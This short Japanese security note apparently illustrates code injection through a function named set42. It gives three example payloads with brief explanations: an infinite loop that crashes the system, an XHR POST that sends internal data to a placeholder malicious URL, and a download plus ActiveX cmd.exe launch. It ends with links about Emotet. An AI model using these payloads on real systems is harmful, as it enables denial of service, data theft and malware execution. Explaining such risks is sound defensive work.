```javascript
set42("while(true); let a");
```

無限ループでシステムクラッシュ

```javascript
set42('XHR.open("POST", "https:悪意のあるURL); XHR.send(内部データ);let a');
```

内部データの機密データを外部に送信

```javascript
set42("const link = document.createElement('a');link.download = 'result.csv';link.href = '不正なURL'; link.click();  new ActiveXObject('WSctipt.Shell').Run('C:\\Windows\\System32\\cmd.exe'); let a=");
```

特定のURLからマルウェアなどの不正なファイルをダウンロードしてサーバー上でcmd.exeファイルを実行することができる。

少し話題が外れるが以下参考
[社内でのEmotet感染](https://www.mbsd.jp/blog/20181225_2.html)
[流行マルウェア「EMOTET」の内部構造を紐解く](https://rfgricoh-my.sharepoint.com/:p:/g/personal/seiichi_kondoh_jp_ricoh_com/ERnBRvr64exMhOashRyDH84BzcszJicerRVoznAR6zQvig?e=ss41hT)